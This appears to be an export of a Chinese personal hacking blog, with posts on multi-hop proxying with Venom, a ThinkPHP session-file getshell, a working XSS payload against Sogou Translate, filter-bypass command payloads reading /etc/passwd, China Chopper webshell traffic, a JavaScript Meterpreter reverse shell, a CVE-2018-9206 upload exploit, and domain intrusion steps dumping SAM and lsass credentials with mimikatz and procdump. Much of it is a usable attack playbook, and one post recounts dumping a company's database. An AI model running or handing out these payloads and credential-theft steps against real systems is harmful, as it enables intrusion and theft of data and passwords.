下载地址：自行找吧(●’◡’●) Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。 反向socks代理1目标边界： 192.168.31.98 agent.exe -rhost 192.168.31.138 -rport 123452攻击机： 192.168.31.138 .&#x2F;admin_linux_x86 ‐lport 12345 因为这款工具是交互式的，用法如下 1root@onlyfree:~/Venom v1.1.0# ./admin_linux_x86 -lport 123452Venom Admin Node Start...34 ____ ____ &#123; v1.1 author: Dlive &#125;5 \\ \\ / /____ ____ ____ _____6 \\ Y // __ \\ / \\ / \\ / \\7 \\ /\\ ___/| | ( &lt;_&gt; ) Y Y \\8 \\___/ \\___ &gt;___| /\\____/|__|_| /9 \\/ \\/ \\/10 11(admin node) &gt;&gt;&gt; 12[+]Remote connection: 192.168.31.99:6176513[+]A new node connect to admin node success14(admin node) &gt;&gt;&gt; 15(admin node) &gt;&gt;&gt; goto 116node 117(node 1) &gt;&gt;&gt; shell18You can execute commands in this shell :D, 'exit' to exit.19Microsoft Windows [�汾 10.0.17763.973]20(c) 2018 Microsoft Corporation����������Ȩ����2122C:\\Users\\19000\\Desktop\\������͸\\tools\\������͸\\Venom.v1.1.0\\Venom v1.1.0&gt;whoami23whoami24fuck\\190002526C:\\Users\\19000\\Desktop\\������͸\\tools\\������͸\\Venom.v1.1.0\\Venom v1.1.0&gt;exit27exit28(node 1) &gt;&gt;&gt; socks 1001029a socks5 proxy of the target node has started up on the local port 10010.30(node 1) &gt;&gt;&gt; 暂时先记录那么多，等有更好的工具也会更新的。 正向代理个人偏好：NeoreGeorg（因为走的HTTP隧道，比较不会杀）反向代理个人偏好：venom端口转发个人偏好：abptts（也是HTTP隧道）","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"thinkphp<6.0.2 getshell漏洞","slug":"thinkphp-6-0-2-getshell漏洞","date":"2020-01-23T10:35:51.000Z","updated":"2020-01-29T10:30:56.775Z","comments":true,"path":"2020/01/23/thinkphp-6-0-2-getshell漏洞/","link":"","permalink":"http://yoursite.com/2020/01/23/thinkphp-6-0-2-getshell%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"thinkphp 6.0.2发布的时候修复了sessionid检查的隐患，经大佬的测试发现如写法不当会造成getshell漏洞 thinkphp会以session id作为文件名来创建对应的session文件保存在/runtime/session/目录 原理思路看的明白，代码看不懂，直接写复现啦。 漏洞复现 漏洞造成的原理： thinkphp会将session id作为文件，而正好thinkphp 6.0.1不会对其值校验，导致可传入任意字符为.php文件那么如果程序写法不当将某可控值传递到session，那么就可以导致写入php文件，并且内容可控导致getshell Code： 1&lt;?php2namespace app\\controller;34use app\\BaseController;5use think\\facade\\Request;6use think\\App;7use think\\Session;89class Index extends BaseController10&#123;11 public function index()12 &#123;13 $session_id = Request::get('sid'); # 获取get请求的sid参数并赋值给$session_id14 $username = Request::get('name'); # 获取get请求的name参数并赋值给$username1516 $session = new Session(new App()); # 创建session类17 $session-&gt;setId($session_id); # 设置session id为$session_id变量18 $session-&gt;set('username', $username); # 设置username值为$username19 $session-&gt;save(); # 保存20 &#125;21&#125; 然后请求 1http:&#x2F;&#x2F;127.0.0.1&#x2F;tp6&#x2F;public&#x2F;index.php&#x2F;index&#x2F;?sid&#x3D;1234567890123456789012345678.php&amp;name&#x3D;%3C?php%20phpinfo();?%3E 然后写入的格式为/runtime/session/sess_文件名.php","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"内网渗透思路建立【待续】","slug":"内网渗透思路建立【待续】","date":"2020-01-16T18:02:09.000Z","updated":"2020-01-26T17:02:44.685Z","comments":true,"path":"2020/01/17/内网渗透思路建立【待续】/","link":"","permalink":"http://yoursite.com/2020/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%BB%BA%E7%AB%8B%E3%80%90%E5%BE%85%E7%BB%AD%E3%80%91/","excerpt":"","text":"基础概念 工作组 每台计算机都是对等的，a机器不能登录b机器。 域环境 控制内网所有处于内外域环境的机器（方便大企业管理，不需要挨个计算机操作，只能域管理员登录） 域机器 可登录内外邮件服务器、OA服务器等 域用户 员工 域管 如IT部门的运维人员，维护安全和下发任务（每台机器该干什么） 域控 控制很多台服务器的机器 内网攻击步骤1. 判断拿下的服务器是工作组（内网环境下用户a不能登陆用户b电脑）还是域机器（管理很多内网主机的）工作组： 要进行端口转发（将内网端口数据转发到外网，比如他3389端口只能内网连接，那么我们将他端口的3389数据转发到我们服务器的33891端口，然后连接33891就等同于连接他内外的3389端口） 2. socket代理：正向代理： 比如在内网机器打通一个可以连接他内网的渠道，然后在我们机器代理这个渠道就可以连通他内网，也可以理解为VPN概念，比如我们机器代理了VPN，那么我们就可以通过VPN访问到国内无法访问的GOOGLE（还不懂用下VPN然后找下中间的过程吧）反向代理： 在自己的机器上建立一个连接渠道，然后将内网服务器连接我们机器的渠道，就可以连通他内网（可以想象成你在我家装了一个电话，然后你可以在你家和我通话，而正向代理是我在你家装了电话，然后我可以和你通话） 3. 利用第二步进入了内网，我们可以扫描弱口令（RDP弱口令、SSH弱口令、MSSQL弱口令、Tomcat弱口令…）和扫描web资产（扫描段下的有漏洞的服务，如Jboss、Weblogic、St2，内网日内网是比日外网较简单的，因为有人会觉得我把一些低安全性的服务搭建在内网，别人又打不开，莫得事。）4. 拿下了内网权限后，读密码，内网攻击步骤总归于密码收集，直到取到域管密码（如读取本机密码、服务密码、浏览器存储的用户信息等）5. 信息收集1、查看本机权限（命令：whoami /user）（如果权限太低，我们可以进行提权，但一般都最好不要，因为如一些监测系统看到你执行了提权的exploit会有警报，然后运维人员发现了，更改了机器的密码什么的，就功亏一篑，或者护网情况下，可能会把他们机器搞崩溃，如exploit导致服务干嘛干嘛的，而且一般普通用户权限，只要不会低的什么都不能干，都可以信息收集，和取密码） 2、查看网络连接信息（命令：netstat -ano），可以看到TCP、UDP信息，用此命令于获取内网IP分布（如可以看到外网的什么IP连接了内网的什么，也可以用于应急响应，比如可以看哪个逼连接进来了内网什么的） 3、查看系统信息（命令：systeminfo，比如看系统打的补丁、网卡信息等、操作系统版本… 具体自己执行看看） 4、查看安装的杀毒软件（命令：WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List），但不一定是完整的 5、查看当前安装的程序（命令：wmic product get name,version） 6、查看在线用户，比如有些管理员3389连接着，并没有关闭，那么我们就可以看（命令：quser） 7、查看网络配置（也可以看DNS信息，如果有是域内，如果没有应该是工作组）（命令：ipconfig /all） 8、查看进程信息（命令：tasklist /v），比如可能某个进程是域管创的，那么我们可以通过管理员权限凭证窃取来获取hash值来拿下域（等同于web的拿下管理员cookie然后利用cookie登录后台管理网站） 9、查看当前登录域（命令：net config workstation） 10、查看Window远程连接历史记录（命令：cmdkey /l），如果保存了连接凭证，我们可以取夏利解密然后登录 11、查看本机用户列表（net user） 12、查看本机用户Fuck的信息（命令：net user Fuck） 13、显示所在域的用户名单（命令：net user /domain） 14、获取某个域用户的详细信息（命令：net user 域用户 /domain） 15、修改域管理员密码，需要域管权限（命令：net user /domain username password） 16、待续更新","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"搜狗一处xss绕过","slug":"搜狗一处xss绕过","date":"2020-01-14T23:43:45.000Z","updated":"2020-01-14T23:44:39.443Z","comments":true,"path":"2020/01/15/搜狗一处xss绕过/","link":"","permalink":"http://yoursite.com/2020/01/15/%E6%90%9C%E7%8B%97%E4%B8%80%E5%A4%84xss%E7%BB%95%E8%BF%87/","excerpt":"","text":"本来只是上网搜索一下不懂的英文，然后就引发此文了 突发异想首先正常打开是 中文 翻译为 英文，如图 然后就在想，中文转英文会出翻译结果（这里我指的是输出的可控字符和返回的不一样，我想打xss这显然不符合，所以我应该找其他语言翻译解决这个问题），然后我试了一下日语 翻译为 英文 设想实现了，直接试试打poc 哦吼 绕过1https:&#x2F;&#x2F;translate.sogou.com&#x2F;#ja&#x2F;en&#x2F;123%22%3E%3Cscript%3Ealert(1) 不给我执行&lt;script&gt;可以，但你已经执行了&lt;hr&gt;就不行，所以我必须绕 害，懒得写过程了，直接丢出来 1https:&#x2F;&#x2F;translate.sogou.com&#x2F;#ja&#x2F;en&#x2F;cron%22%3E%3Cscript%3E(alert)(1); 凭感觉绕的，瞎想觉得这样可以然后就试试然后就真可以了。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"2020年初到","slug":"2020年初到","date":"2020-01-01T07:40:29.000Z","updated":"2020-01-01T07:51:30.718Z","comments":true,"path":"2020/01/01/2020年初到/","link":"","permalink":"http://yoursite.com/2020/01/01/2020%E5%B9%B4%E5%88%9D%E5%88%B0/","excerpt":"","text":"曾经在作文写的2020年，如今已经到了，我不得不感慨时间流逝的太快，很多事还没缓过来，人就已经长大了。 依然记得上年年初列的目标，如今它已经过了，而我未达到一半条数，不愧是我，不一样的烟火。 过去的已过去，愿大家去年所有的遗憾都会变成今年惊喜的垫铺。 2020年目标： 内网渗透 挖进腾讯SRC年度前十 博客最低一周一更 存款六位数以上（今年支出了30w+，收入25w不到）","categories":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"感慨","slug":"感慨","permalink":"http://yoursite.com/tags/%E6%84%9F%E6%85%A8/"}]},{"title":"命令执行绕过Payload","slug":"命令执行绕过Payload","date":"2019-12-31T04:04:37.000Z","updated":"2019-12-31T04:05:26.231Z","comments":true,"path":"2019/12/31/命令执行绕过Payload/","link":"","permalink":"http://yoursite.com/2019/12/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87Payload/","excerpt":"","text":"利用连接符来执行命令读取/etc/passwd 1&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d 执行ls 1&#39;&#39;&#39;l&#39;&#39;s&#39;&#39;&#39; 查看nc是否安装 1&#39;&#x2F;&#39;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;&#39;c&#39;&#39;&#39; 或者 1&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c 又或者 1&#x2F;b\\i\\n&#x2F;w\\h\\i\\c\\h n\\c 利用未初始化的bash先来看看没有定义的变量($a) 可以看到返回的是null，那么可以去利用这个特性来执行其他命令","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"好奇心-菜刀连接shell进行了什么操作","slug":"好奇心-菜刀连接shell进行了什么操作","date":"2019-12-30T20:06:20.000Z","updated":"2019-12-30T20:29:39.061Z","comments":true,"path":"2019/12/31/好奇心-菜刀连接shell进行了什么操作/","link":"","permalink":"http://yoursite.com/2019/12/31/%E5%A5%BD%E5%A5%87%E5%BF%83-%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5shell%E8%BF%9B%E8%A1%8C%E4%BA%86%E4%BB%80%E4%B9%88%E6%93%8D%E4%BD%9C/","excerpt":"","text":"简介我们都知道，只要写入了一个脚本文件，然后接受一个参数来执行代码，菜刀连接上去我们就可以进行增删改查权限了，那么这个时候菜刀究竟干了什么？我们来看看 1、我在本地写了一个shell，密码为eiywexdtolthvzztvoyfuoqglpcjlwerifzzrzslutzxutreje 2、设置菜刀代理为我们burp的带来来接收数据 然后连接进去burl就会抓取一个数据包 1POST /Joomla_3.4.6-Stable-Full_Package//configuration.php HTTP/1.12User-Agent: Java/1.8.0_1613Host: 127.0.0.14Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.25Content-type: application/x-www-form-urlencoded6Content-Length: 6897Connection: close89eiywexdtolthvzztvoyfuoqglpcjlwerifzzrzslutzxutreje=@eval\u0001(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtlY2hvKCItJmd0O3wiKTs7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2fQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyR1c3I9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJ8Jmx0Oy0iKTtkaWUoKTs%3d 大概流程就是执行eval，然后base64解码action的参数，我们编码看看执行了什么代码 1@ini_set(\"display_errors\",\"0\");@set_time_limit(0);echo(\"-&amp;gt;|\");;$D=base64_decode($_POST[\"z1\"]);$F=@opendir($D);if($F==NULL)&#123;echo(\"ERROR:// Path Not Found Or No Permission!\");&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.\"/\".$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"2\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(\"|&amp;lt;-\");die(KTs= 列了当前路径、计算机名、计算机系统等信息，然后下个请求读取当前路径的文件，然后我们点击哪个文件就会fopen哪个文件，并且列出字节数、创建时间。 其实还挺简单的，然后一些免杀菜刀就是改底层然后修改获取这些目录、文件的代码，和绕过shell一样的，有空我再看看，此文章没学习性，我就是好奇看看","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"http://yoursite.com/tags/Tools/"}]},{"title":"一次困难的渗透记录[思路描述]","slug":"一次困难的渗透记录-思路描述","date":"2019-12-27T19:52:34.000Z","updated":"2020-01-31T18:42:57.812Z","comments":true,"path":"2019/12/28/一次困难的渗透记录-思路描述/","link":"","permalink":"http://yoursite.com/2019/12/28/%E4%B8%80%E6%AC%A1%E5%9B%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-%E6%80%9D%E8%B7%AF%E6%8F%8F%E8%BF%B0/","excerpt":"","text":"故事开局一个朋友的同学的老师没当教师了，转去IT行业，然后他们公司有一个项目上线很久了，觉得不安全，找到我帮忙测试让我获取shell或者看test表下的数据（我一开始以为很多钱，结果给我一条烟的钱，什么烟？？1906啊），这里记录下过程 各攻击点环环受阻，cnm**** 这个注入点是这样的。。。1、找到一个注入点，注入参数不能url编码，而且语句有时候会变（没遇到过，求解释）2、有编辑器漏洞但上传目录没有写权限3、第二个编辑器有上传漏洞但显示上传目录不存在。。。4、.git泄露，但打包的不完整。。。5、找不到后台。。。6、注入想写shell结果是站库分离。。。。。。。。。。。。。 大部分口头描述，主要描述思路，敏感时期 利用过程1、扫描主站目录的时候跑出来了一个日志信息xxx.xxx.xxx/logs/web.log，大致信息是大马操作痕迹。。和xss、目录扫描、sql注入扫描记录（应该是之前有测试过或者被黑过） 2、扫描子域名，在一处子域名下获取了.git源码泄露漏洞，然后利用lijiejie的GitHack工具直接打包，但是他总共807个文件，只下载了26个文件（不知道怎么回事，下载失败的都显示File not found，没理解过.git泄露漏洞），然后没下载的文件都列出了目录地址（下载失败，但文件都是存在的） 3、用git泄露获取了mysql配置信息，但是他用的是阿里云数据库，站库分离，且限定ip才能连接，此利用链无果 4、利用第二步获取了全站的目录信息（这个漏洞和我说没危害。。），然后找到了一个editor编辑器漏洞，尝试上传文件 1&#123;&quot;error&quot;:1,&quot;message&quot;:&quot;\\u4e0a\\u4f20\\u76ee\\u5f55\\u6ca1\\u6709\\u5199\\u6743\\u9650\\u3002&quot;&#125;23解码后45&#123;&quot;error&quot;:1,&quot;message&quot;:&quot;上传目录没有写权限。&quot;&#125; 5、在另一个子域名下也找到了这个编辑器漏洞（上传目录不存在）。。 6、然后现在测试已经是第五天了（中间一直摸鱼），找到了一个注入，手工测是可以直接用的，然后丢sqlmap一片红 此注入条件： 11、不能编码22、逻辑达到一定的时候，语句会变，我不太懂sql注入，所以描述的不明白33、这是个显错注入44、注入的参数是这样的&#96;&#x2F;xxxxx-xxxx-注入点-999.htm&#96; 然后我手工注入（懒不想手注）的时候用or updatexml(0,concat(0x7e,(这里可以直接执行语句)),0)，然后利用sqlmap的--skip-urlencode和--suffix=、--prefix=指定前缀后缀依旧失败（因为我想让sqlmap的payload在updatexml(0,concat(0x7e,(这里执行)),0)），经过很多失败后，我想到了一个新的点~ 利用php请求注入点，接受payload带入到updatexml函数里 然后直接跑 1sqlmap -u http:&#x2F;&#x2F;localhost&#x2F;sql.php?payload&#x3D;* -v 5 然后直接找test表然后dump就完成了。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"Hacker","slug":"Hacker","permalink":"http://yoursite.com/tags/Hacker/"}]},{"title":"利用js反弹shell","slug":"利用js反弹shell","date":"2019-12-24T09:26:37.000Z","updated":"2019-12-24T09:26:58.340Z","comments":true,"path":"2019/12/24/利用js反弹shell/","link":"","permalink":"http://yoursite.com/2019/12/24/%E5%88%A9%E7%94%A8js%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"JavsScript是可以通过创建ActiveXObject来执行命令，但是基本上不会存在，因为需要一定的设置且使用ie浏览器打开 漏洞复现设置 默认是没有开启ActiveX控件的，那么我们可以自己设置 复现过程这里用js反弹shell 下载工具：https://github.com/CroweCybersecurity/ps1encode 使用如下命令生成反弹shell的js代码 1.&#x2F;ps1encode.rb --LHOST 192.168.31.133 --LPORT 6666 --PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp --ENCODE cmd -t js 然后把他放到index.html页面，代码如下 1&lt;script type=\"text/javascript\"&gt;2 3 生成的js代码45&lt;/script&gt; 然后在msf上面监听 1msf5 &gt; use exploit&#x2F;multi&#x2F;handler2msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.31.1333LPORT &#x3D;&gt; 192.168.31.1334msf5 exploit(multi&#x2F;handler) &gt; set LPORT 66665LPORT &#x3D;&gt; 6666 然后在ie浏览器上打开index.html页面，在msf就成功接收到反弹过来的shell了 如果对方足够傻的情况下，是可以利用社工完成这些设置操作步骤的，但是如果真够傻的话往常直接丢exe给他更好。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"CVE-2018-9206漏洞复现及原理","slug":"CVE-2018-9206漏洞复现及原理","date":"2019-12-24T08:11:33.000Z","updated":"2019-12-24T08:11:50.887Z","comments":true,"path":"2019/12/24/CVE-2018-9206漏洞复现及原理/","link":"","permalink":"http://yoursite.com/2019/12/24/CVE-2018-9206%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86/","excerpt":"","text":"介绍 下载地址：https://codeload.github.com/blueimp/jQuery-File-Upload/zip/v9.22.0 此漏洞是在15年的时候就已经出现的，但是是在18年的时候才列为cve编号 1漏洞影响版本23version &lt;&#x3D; 9.22.0 and with Apache &gt; 2.3.9 使用curl上传shell1curl -F &quot;files&#x3D;@phpinfo.php&quot; http:&#x2F;&#x2F;127.0.0.1&#x2F;jQuery-File-Upload-9.22.0&#x2F;server&#x2F;php&#x2F;index.php2# 将phpinfo.php上传 然后访问 1http:\\&#x2F;\\&#x2F;127.0.0.1\\&#x2F;jQuery-File-Upload-9.22.0\\&#x2F;server\\&#x2F;php\\&#x2F;files\\&#x2F;phpinfo.php 使用工具上传shell 下载地址：https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206 1.&#x2F;CVE-2018-9206.sh http:&#x2F;&#x2F;192.168.8.100&#x2F;jQuery-File-Upload-9.22.0&#x2F; 漏洞原理首先我们用curl来将请求换成ceye看看其中发送了什么数据 1curl -F &quot;files&#x3D;@phpinfo.php&quot; ceye地址 1--------------------------4bb40881c6a8e5932Content-Disposition: form-data; name&#x3D;&quot;files&quot;; filename&#x3D;&quot;phpinfo.php&quot;3Content-Type: application&#x2F;octet-stream45&quot;&lt;?php phpinfo();?&gt;&quot; 67--------------------------4bb40881c6a8e593 可以看到这里只是一个正常的上传请求，也就是说这个漏洞就是一个任意文件上传。。。。。。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"初始域渗透简略笔记","slug":"初始域渗透简略笔记","date":"2019-12-24T04:29:37.000Z","updated":"2019-12-24T04:38:15.327Z","comments":true,"path":"2019/12/24/初始域渗透简略笔记/","link":"","permalink":"http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/","excerpt":"","text":"这篇文章是根据ske师傅的视频写的笔记，视频地址：https://www.bilibili.com/video/av76554533?from=search&amp;seid=11390449822159779985 写这篇文章只是记录看这个视频的笔记，等哪天有实战环境了会自己出一张更详细的 1、什么是域域英文叫DOMAIN，将网络中多台计算机逻辑组织到一起，进行集中管理，这种区别于环境组的逻辑环境叫做域 简单来说，假设我的公司有很多个计算机，然后我想设置一些配置，比如修改密码、设置权限等，只需要对域进行操作，就可以直接更改域下面的计算机，就和团队老大一样的意思，在群里艾特全体成员，说你们明天不用上班一样。方便快速，不用一个一个去说。 2、域控（全称域控制器）在一个机器上装上活动目录（存储了有关网络对象信息，并且让管理员和用户能够轻松的查找和使用这些信息。网络对象可以是用户、群组、电脑、网域控制器、邮件、配置文件、组织单元、树系等）后，这个机器就是一个域控服务器 在一个内网中，可能有很多个域控，他们是没有区分的。 假设你有三个域控制器a、b、c，那么你在a对用户权限进行修改，那么他会复制到b、c里，如果其中一台域控制器发生故障，其他域控还能正常工作的话，整个域还是可以正常运行的。 3、域用户就是域控制器的用户，域用户的账号密码可以登陆同一域下的任何机器，但是只是普通权限，而非管理员权限。 4、域管可以登陆域控制器上，对一切权限进行控制，域管只需要登陆到域上面进行操作，任何就会应用到域机器，而不用去每台电脑前操作。 5、组将不同用户放入不同的分组里，然后对每个组进行一个权限设置，这样子简单方便的对每一台机器进行权限分配，而不用每个去设置。 6、信任域比如公司下面有子公司，他们都有域，并且处于同一个内网，那么只要子公司的域建立了对母公司的域的信任，那么母公司的域的域用户，就可以登陆到子公司的域，而子公司的域用户不能登陆到母公司的域用户，实战中可能遇到的域不知一个，那么我们可以在当前域查看信任域，然后利用横向渗透登陆到其他域控制器。 7、域信息收集使用nltest查询信用域 nltest在03以后系统自带的 信任域：可以在工作组里查询，查询内网是否有域环境 1如下命令就可以查找域控IP所有信任域信息2nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP 用ipconfig /all就可以查找域控IP，如图 然后执行nltest后如图 可能实战中，信任域环境不仅仅一个 知道信任域名字(HACK)后，可以使用如下命令查找详细的信任域信息 1nltest &#x2F;dsgetdc:HACK &#x2F;server:域控IP 可以用这种办法查找是否存在域环境 域信息收集Csvde Csvde是Window Server 2008的内置命令行工具，位于%windir%/system32文件夹中。 使用如下命令查找HACK这个域的详细信息 1csvde -setspn hack -f 导出的地址 导出的数据信息 查找域内各种服务资源的对应关系setspn spn官方名称是服务主体名称，存着的信息是域内的各种服务器的机器名、服务端口号等 如下命令查找HACK域的spn信息 1setspn -T hack -Q *&#x2F;* 用处就是，比如护网期间，获取了域控权限，然后我们可以看域内下面的开发的服务，比如mysql，然后使用域用户登录到那台机器，然后连接mysql就可以看到数据，然后提交到获取护网分数。 dnsdump查找域下名称和IP1dnsdump.exe 域名\\域用户 -p 域密码 域控机器名 net假设我们拿下了一个服务器，他是域用户，那么我们可以使用net命令收集一些信息 1net user &#x2F;domain 获取域用户列表2net group &quot;domain admins&quot; &#x2F;domain 获取域管理员列表3net group &quot;domain controllers&quot; &#x2F;domain 查看域控制器4net group &quot;domain computers&quot; &#x2F;domain 查看域机器5net group &#x2F;domain 查询域里面的组 1net view 查看同一域内机器列表2net view \\\\ip 查看某IP共享3net view \\\\GHQ 查看GHQ计算机的共享资源列表4net view \\\\domain 查看内网存在多少个域5net view \\\\domain:XYZ 查看XYZ域中的机器列表 扫描内网段的主机信息和域控机1nbtscan.exe 192.168.52.0&#x2F;24 图里的DC就是表示这个是域控机器 如果不存在域的话结果如下 域渗透思路步骤 横向渗透（拿下内网shell） 权限维持（以防给管理员发现，然后下线shell） 取密码（获取一个域用户和账号密码，跑弱口令等等） 域信息收集（就是第七步所写的，注意那是在跑出域账户和密码情况下并且登陆后才能收集，如果非域权限是禁止执行那些命令的） 横向渗透（进行域的横向渗透） 取密码（直到取到域管理员账户密码） 获取域管权限（使用域管理员账户和密码登陆） 拿下域控服务器（结局） 注册表读取密码1reg save hklm\\system 导出的地址.hiv 2reg save hklm\\sam 导出的地址.hiv 然后就会生成sys.hiv和sam.hiv文件 然后使用mimikatz.exe工具读取密码的hash值 1mimikatz.exe &quot;lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:sys.hiv&quot; 问题1： 然后跑出的hash放md5网站解密出来就是密码了 lsass读取内存hash比如在内网中，有一个域用户和域管登陆了你拿下的shell的机器，那么在本机中会将他们的账号和密码保存到lsass.exe进程里面，那么我们只要把lsass.exe进程抓取出来然后跑hash就可以了 2008前，他都是明文存储的 抓取lsass.exe进程为lsass.dmp 1procdump.exe -accepteula -ma lsass.exe lsass.dmp 然后使用mimikatz.exe将起读取 1mimikatz.exe &quot;sekurlsa::minidump lsass.dmo&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; 在目标shell中获取信息，然后放到本地用工具跑出这些数据，可以防止被拦截。 读取当前机器各种连接工具密码、浏览器保存的密码等 下载地址：https://github.com/AlessandroZ/LaZagne/releases/ 凭证窃取 下载地址： 1incognito.exe list_tokens -u2incognito.exe execute -c &quot;HACK&#x2F;Administrator&quot; cmd.exe3窃取HACK&#x2F;Administrator这个域管的凭证，放到cmd.exe进程，这样子我们的cmd就是域管的权限了 命令行渗透为什么涉及命令行渗透？1、因为远程登录目标桌面容易被管理员发现，如你将他挤下或者管理员突然间登录进来2、目标管理员可能对服务器禁用远程登录 那么我们可以建立ipc连接，建立了ipc连接的话我们可以对目标进行文件的下载和上传，以及执行命令 建立ipc连接1net use \\\\你拿下的服务器ip &#x2F;u:用户名 密码 在ipc连接下看目录是这样的 将nbrscan.exe放到windows\\temp目录下 将hash.txt下载下来 这里直接粘贴了=v= 